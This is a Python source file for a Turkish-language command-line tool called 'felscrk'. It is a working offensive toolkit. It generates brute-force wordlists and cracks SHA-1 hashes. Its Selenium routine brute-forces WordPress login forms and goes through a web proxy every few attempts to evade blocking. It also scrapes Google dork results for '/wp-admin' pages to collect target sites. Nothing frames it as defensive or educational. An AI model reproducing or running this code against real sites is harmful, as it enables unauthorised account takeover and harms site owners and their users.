import hashlib
from itertools import product
import requests
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException
import time

# Renkli başlık fonksiyonu
def print_colored_title(title):
    print("\033[1;32;40m" + title + "\033[0m")

def generate_wordlist(min_length, max_length, characters, known_prefix=None):
    with open('wordlist.txt', 'w') as file:
        prefix_length = len(known_prefix) if known_prefix else 0

        for length in range(max(prefix_length, min_length), max_length + 1):
            for combination in product(characters, repeat=length - prefix_length):
                word = known_prefix + ''.join(combination)
                file.write(word + '\n')

def crack_sha1_hash(hash_to_crack, wordlist_file):
    with open(wordlist_file, 'r') as file:
        for line in file:
            password = line.strip()
            hashed_password = hashlib.sha1(password.encode()).hexdigest()

            if hashed_password == hash_to_crack:
                return password

    return None

def sha1_encrypt(plain_text):
    hashed_text = hashlib.sha1(plain_text.encode()).hexdigest()
    return hashed_text

def automate_login_attempt(username, link, password_file_path):
    # WebDriver'ı başlatma
    driver = webdriver.Chrome()

    try:
        deneme_sayisi = 0
        max_deneme_sayisi = 5

        with open(password_file_path, 'r') as password_file:
            for line in password_file:
                password = line.strip()

                # Her 5 denemede bir croxyproxy.com'u ziyaret et
                if deneme_sayisi % max_deneme_sayisi == 0:
                    driver.get("https://www.croxyproxy.com/")

                    croxy_input = WebDriverWait(driver, 10).until(
                        EC.presence_of_element_located((By.ID, "url"))
                    )
                    croxy_input.clear()
                    croxy_input.send_keys(link)
                    croxy_input.send_keys(Keys.RETURN)
                    time.sleep(2)  # 2 saniye bekleme

                # Kullanıcı adı ve şifreyi giriş yapma
                username_input = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "log")))
                password_input = driver.find_element(By.NAME, "pwd")

                # Input değerlerini temizleme
                username_input.clear()
                password_input.clear()

                username_input.send_keys(username)
                password_input.send_keys(password)
                password_input.send_keys(Keys.RETURN)

                time.sleep(2)  # 2 saniye bekleme

                try:
                    # Login formu yoksa NoSuchElementException hatası alınacaktır
                    login_form = driver.find_element(By.CSS_SELECTOR, "form[action*='login']")
                except NoSuchElementException:
                    # NoSuchElementException hatası alındıysa, başarılı yazdır
                    print(f"\033[1;32;40mBaşarılı: Giriş başarılı! Şifre: {password}\033[0m")
                    break
                else:
                    print(f"\033[1;31;40mHata: Giriş başarısız. Şifre denendi: {password}\033[0m")

                deneme_sayisi += 1

    except Exception as e:
        print(f"\033[1;31;40mHata: {e}\033[0m")
    finally:
        # WebDriver'ı kapatma
        driver.quit()

def kelime_ara(kelime, site_sayisi):
    # Google'da arama yap
    url = f"https://www.google.com/search?q={kelime}+inurl:/wp-admin"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"}
    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        # Tüm sonuçları al
        sonuclar = soup.find_all('div', class_='tF2Cxc')

        wordpress_sites = []  # WordPress sitelerini tutacak liste

        for index, sonuc in enumerate(sonuclar, 1):
            baslik = sonuc.find('h3').text
            link = sonuc.find('a')['href']
            
            # WordPress kontrolü
            if "/wp-admin" in link:
                print(f"{index}. \033[1;32;40mWordPress Site: {baslik} - {link}\033[0m")
                wordpress_sites.append(link)
            else:
                print(f"{index}. \033[1;31;40mWordPress dışında bir site bulundu.\033[0m")

                # Kullanıcının belirttiği sayıya ulaşıldığında döngüyü sonlandır
                if index >= site_sayisi:
                    break

        # WordPress sitelerini sites.txt dosyasına yaz
        with open("sites.txt", "w") as file:
            for site in wordpress_sites:
                file.write(site + "\n")

        print(f"Toplam {len(wordpress_sites)} WordPress sitesi bulundu ve sites.txt dosyasına yazıldı.")
    else:
        print("\033[1;31;40mArama başarısız.\033[0m")

def wordpress_ara():
    kelime = input("\033[1;36;40mLütfen aramak istediğiniz kelimeyi girin: \033[0m")
    site_sayisi = int(input("\033[1;36;40mKaç WordPress sitesi bulmak istiyorsunuz?: \033[0m"))
    kelime_ara(kelime, site_sayisi)

if __name__ == "__main__":
    try:
        # Başlık
        print("-------------")
        print_colored_title("   felscrk")
        print("-------------")

        while True:
            print("\nSeçenekleri belirtin:")
            print("1. Wordlist Oluştur")
            print("2. SHA-1 Hash Çöz")
            print("3. Metni SHA-1 ile Şifrele")
            print("4. WP Brute Force")
            print("5. WP Site Ara")
            print("6. Çıkış")

            option = int(input("\033[1;36;40mSeçeneği girin (1, 2, 3, 4, 5 veya 6): \033[0m"))

            if option == 1:
                min_length = int(input("\033[1;36;40mMinimum karakter uzunluğunu girin: \033[0m"))
                max_length = int(input("\033[1;36;40mMaksimum karakter uzunluğunu girin: \033[0m"))
                characters = input("\033[1;36;40mKullanılacak karakterleri girin: \033[0m")
                known_prefix = input("\033[1;36;40mŞifrenin başını biliyor musunuz? (Evet için bir kelime, hayır için boş bırakın): \033[0m")

                generate_wordlist(min_length, max_length, characters, known_prefix)
                print("\033[1;32;40mWordlist başarıyla oluşturuldu: wordlist.txt\033[0m")
            elif option == 2:
                hash_to_crack = input("\033[1;36;40mÇözümlenecek SHA-1 hash'i girin: \033[0m")
                wordlist_file = input("\033[1;36;40mKullanılacak wordlist dosyasını girin: \033[0m")

                password = crack_sha1_hash(hash_to_crack, wordlist_file)

                if password:
                    print(f"\033[1;32;40mŞifre çözüldü: {password}\033[0m")
                else:
                    print("\033[1;31;40mŞifre çözülemedi. Wordlist'te uygun şifre bulunamadı.\033[0m")
            elif option == 3:
                plain_text = input("\033[1;36;40mŞifrelenecek metni girin: \033[0m")
                hashed_text = sha1_encrypt(plain_text)
                print(f"\033[1;32;40mSHA-1 ile şifrelenmiş metin: {hashed_text}\033[0m")
            elif option == 4:
                username = input("\033[1;36;40mKullanıcı Adı: \033[0m")
                link = input("\033[1;36;40mGiriş Yapılacak Link: \033[0m")
                password_file_path = input("\033[1;36;40mŞifrelerin Bulunduğu Dosya Yolu: \033[0m")
                automate_login_attempt(username, link, password_file_path)
            elif option == 5:
                wordpress_ara()
            elif option == 6:
                print("\033[1;32;40mProgramdan çıkılıyor...\033[0m")
                break
            else:
                print("\033[1;31;40mGeçersiz seçenek. Lütfen 1, 2, 3, 4, 5 veya 6 girin.\033[0m")

    except ValueError:
        print("\033[1;31;40mHata: Geçersiz bir sayı girişi yapıldı.\033[0m")
    except Exception as e:
        print(f"\033[1;31;40mHata: {e}\033[0m")
